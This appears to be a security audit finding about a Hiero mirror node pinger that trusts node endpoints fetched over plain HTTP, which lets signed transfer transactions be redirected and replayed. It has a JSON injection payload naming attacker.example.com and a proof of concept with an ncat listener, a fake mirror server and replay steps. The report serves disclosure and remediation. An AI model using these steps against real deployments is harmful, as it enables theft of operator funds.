### Title
Unauthenticated Mirror Node Response Allows Attacker-Controlled gRPC Endpoints to Receive Operator-Signed Transactions

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` fetches node endpoints over plain HTTP and accepts any non-zero port from the mirror node's JSON response without further validation. An attacker who can control or MITM the mirror node HTTP connection can inject arbitrary `host:port` entries into the network map, causing the Hiero SDK client to submit operator-signed `CryptoTransfer` transactions to attacker-controlled infrastructure. The attacker can then replay those signed transactions on the real Hedera network within the transaction validity window.

### Finding Description

**Exact code path:**

In `pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()` (lines 74–132):

```go
for _, ep := range n.ServiceEndpoints {
    host := strings.TrimSpace(ep.DomainName)
    if host == "" {
        host = strings.TrimSpace(ep.IPAddressV4)
    }
    if host == "" || ep.Port == 0 {   // ← only check: skip port 0
        continue
    }
    addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
    network[addr] = nodeAccountId     // ← any port 1–65535 accepted
}
``` [1](#0-0) 

The returned `network` map is passed directly to `hiero.ClientForNetwork(netmap)` in `sdk_client.go`:

```go
netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
client = hiero.ClientForNetwork(netmap)
client.SetOperator(opID, opKey)   // operator private key bound here
``` [2](#0-1) 

Then in `transfer.go`, the SDK signs and submits a `CryptoTransfer` to every endpoint in that map:

```go
cryptoTransfer := hiero.NewTransferTransaction()...
resp, err := cryptoTransfer.Execute(client)
``` [3](#0-2) 

**Root cause:** The mirror node HTTP response is fully trusted. The only endpoint filter is `ep.Port == 0`. There is no:
- Port allowlist (e.g., only 50211/50212 for Hedera gRPC)
- IP/hostname allowlist or RFC1918 block
- TLS/certificate pinning on the mirror node HTTP connection (example config uses `http://mirror-rest:5551`) [4](#0-3) 

**Exploit flow:**

1. **Precondition:** Pinger is deployed with `network=other` and `HIERO_MIRROR_PINGER_REST=http://mirror-rest:5551` (plain HTTP).
2. **Trigger:** Attacker performs ARP/DNS poisoning, BGP hijack, or compromises the mirror node host to intercept the HTTP GET to `/api/v1/network/nodes`.
3. **Injection:** Attacker returns a crafted `nodesEnvelope`:
   ```json
   {"nodes":[{"node_account_id":"0.0.3","service_endpoints":[{"ip_address_v4":"attacker.example.com","port":443}]}]}
   ```
   Port 443 passes the `ep.Port == 0` check trivially.
4. **Result:** `hiero.ClientForNetwork` maps `attacker.example.com:443 → 0.0.3`. Every subsequent `CryptoTransfer.Execute(client)` sends a fully operator-signed transaction to the attacker's server.
5. **Replay:** Attacker extracts the signed transaction bytes and submits them to the real Hedera network within the 120-second `transactionValidDuration` window, executing the fund transfer from the operator's account.

### Impact Explanation

The operator's private key is used to sign every periodic transfer (default every 1 second per `cfg.interval`). Each signed transaction is a valid, self-contained Hedera transaction that can be replayed on the real network. The attacker receives a continuous stream of signed transactions and can drain the operator account up to the configured `amountTinybar` per replay window. Because the pinger runs on a ticker loop, the attack is repeatable for as long as the pinger is running. [5](#0-4) 

### Likelihood Explanation

The attack is realistic in any deployment where:
- `network=other` is used (required for custom/private networks)
- The mirror node URL is HTTP (the documented example is `http://mirror-rest:5551`)
- The attacker has network-level access (same Kubernetes namespace, same LAN, or DNS control)

No application-level privileges on the pinger host are required. A Kubernetes-internal attacker (e.g., a compromised sidecar or co-tenant pod) can trivially intercept unencrypted HTTP traffic or poison DNS. The attack is repeatable every tick interval.

### Recommendation

1. **Validate port range:** Reject endpoints whose port is not in the expected Hedera gRPC range (50211–50212) or a configurable allowlist:
   ```go
   if ep.Port == 0 || ep.Port < 1 || ep.Port > 65535 {
       continue
   }
   // optionally: if ep.Port != 50211 && ep.Port != 50212 { continue }
   ```
2. **Enforce HTTPS for the mirror node connection:** Require TLS with certificate verification for `cfg.mirrorRest`; reject `http://` URLs or at minimum warn loudly.
3. **Validate IP addresses:** Reject RFC1918, loopback, and link-local addresses in `ep.IPAddressV4` to prevent SSRF-style redirection to internal services.
4. **Pin or allowlist mirror node identity:** Use TLS client certificates or a static allowlist of trusted mirror node hostnames/IPs.

### Proof of Concept

```bash
# 1. Start a netcat listener on attacker machine (port 443)
ncat -lvp 443 --ssl &

# 2. Poison DNS so "mirror-rest" resolves to attacker IP
#    (or ARP-poison the path, or compromise the mirror-rest pod)

# 3. Serve malicious /api/v1/network/nodes response
python3 -c "
import http.server, json
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({'nodes':[{'node_account_id':'0.0.3',
            'service_endpoints':[{'ip_address_v4':'<ATTACKER_IP>','port':443}]}],
            'links':{'next':None}}).encode()
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(body)
http.server.HTTPServer(('0.0.0.0', 5551), H).serve_forever()
"

# 4. Run pinger with network=other pointing at the poisoned mirror
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://<ATTACKER_IP>:5551 \
HIERO_MIRROR_PINGER_OPERATOR_KEY=<real_key> \
HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.1234 \
./pinger

# 5. Attacker's netcat receives raw gRPC bytes containing the signed
#    CryptoTransfer transaction. Extract and submit to real Hedera network:
#    hedera-cli tx submit --bytes <extracted_bytes>
# => Transfer executes from operator account on real network
```

### Citations

**File:** pinger/mirror_node_client.go (L113-124)
```go
		for _, ep := range n.ServiceEndpoints {
			host := strings.TrimSpace(ep.DomainName)
			if host == "" {
				host = strings.TrimSpace(ep.IPAddressV4)
			}
			if host == "" || ep.Port == 0 {
				continue
			}

			addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
			network[addr] = nodeAccountId
		}
```

**File:** pinger/sdk_client.go (L18-45)
```go
		netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
		if err != nil {
			return nil, err
		}
		client = hiero.ClientForNetwork(netmap)

	case "testnet", "previewnet", "mainnet":
		c, err := hiero.ClientForName(cfg.network)
		if err != nil {
			return nil, err
		}
		client = c

	default:
		return nil, fmt.Errorf("unknown network %q (testnet|previewnet|mainnet|other)", cfg.network)
	}

	opID, err := hiero.AccountIDFromString(cfg.operatorID)
	if err != nil {
		return nil, fmt.Errorf("invalid operator id: %w", err)
	}

	opKey, err := hiero.PrivateKeyFromString(cfg.operatorKey)
	if err != nil {
		return nil, fmt.Errorf("invalid operator key: %w", err)
	}

	client.SetOperator(opID, opKey)
```

**File:** pinger/transfer.go (L29-33)
```go
		cryptoTransfer := hiero.NewTransferTransaction().
			AddHbarTransfer(client.GetOperatorAccountID(), hiero.HbarFromTinybar(-cfg.amountTinybar)).
			AddHbarTransfer(toID, hiero.HbarFromTinybar(cfg.amountTinybar))

		resp, err := cryptoTransfer.Execute(client)
```

**File:** pinger/config.go (L37-37)
```go
	flag.StringVar(&cfg.mirrorRest, "mirror-rest", envOr("HIERO_MIRROR_PINGER_REST", ""), "mirror node REST base URL (required for other), e.g. http://mirror-rest:5551")
```

**File:** pinger/main.go (L54-64)
```go
	ticker := time.NewTicker(cfg.interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			log.Printf("Shutting down")
			return
		case <-ticker.C:
			if err := submitWithRetry(ctx, client, cfg); err != nil {
				if errors.Is(err, context.Canceled) {
```
